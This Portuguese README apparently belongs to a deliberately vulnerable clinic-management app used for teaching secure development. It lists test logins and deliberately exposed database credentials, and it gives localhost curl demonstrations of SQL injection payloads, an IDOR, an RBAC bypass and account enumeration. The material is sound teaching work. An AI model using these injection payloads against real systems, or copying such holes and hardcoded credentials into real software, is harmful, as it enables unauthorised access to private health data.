# VidaPlus (legado) — como rodar e explorar

Sistema de gestão de clínica **intencionalmente vulnerável**, base do projeto da
disciplina SSC. Objetivo: os grupos o **corrigem e adequam** ao longo do SSDLC.

## Subir o ambiente

```bash
docker compose up --build
# Frontend:  http://localhost:4200
# API:       http://localhost:8080
# MySQL:     localhost:3306 (vidaplus / vidaplus123)  ← credencial exposta de propósito
```

## Usuários de teste

| E-mail | Senha | Papel |
|--------|-------|-------|
| admin@vidaplus.local | Admin123 | ADMIN |
| dra.house@vidaplus.local | Medico123 | MEDICO (atende Ana e Carla, **não** Bruno) |
| recepcao@vidaplus.local | Recep123 | RECEPCAO |
| bio@vidaplus.local | Bio123 | BIOQUIMICO |
| ana.paciente@email.com | Paciente123 | PACIENTE (id 1, exames 101/103) |
| bruno.paciente@email.com | Paciente123 | PACIENTE (id 2, exame 102) |

## Falhas exploráveis (demonstração em aula)

```bash
# V-01 SQL Injection no login (ignora a senha):
curl -s -X POST localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@vidaplus.local'"'"' -- ","senha":"qualquer"}'

# Login normal do paciente Ana:
TOKEN=$(curl -s -X POST localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"ana.paciente@email.com","senha":"Paciente123"}' \
  | sed -E 's/.*"access_token":"([^"]+)".*/\1/')

# V-03 IDOR: Ana (dona do 101) acessa o exame 102, que é do Bruno:
curl -s localhost:8080/api/exames/102 -H "Authorization: Bearer $TOKEN"   # retorna 200 (FALHA)

# V-04 RBAC: Ana (paciente) publica um laudo:
curl -s -X POST localhost:8080/api/exames/104/publicar -H "Authorization: Bearer $TOKEN"

# V-13 SQL Injection na busca:
curl -s "localhost:8080/api/pacientes/busca?q=%27%20OR%20%271%27%3D%271"

# V-08 enumeração/reset fraco:
curl -s -X POST localhost:8080/api/auth/reset -H 'Content-Type: application/json' \
  -d '{"email":"naoexiste@x.com"}'   # resposta denuncia inexistência
```

## Estado esperado ao final do semestre

Cada uma dessas explorações deve **deixar de funcionar** e o gate correspondente no
pipeline deve ficar **verde**. O mapa falha → correção → gate fica no repositório
privado do instrutor (`alexorozco-ifsul/SSC-instrutor`).
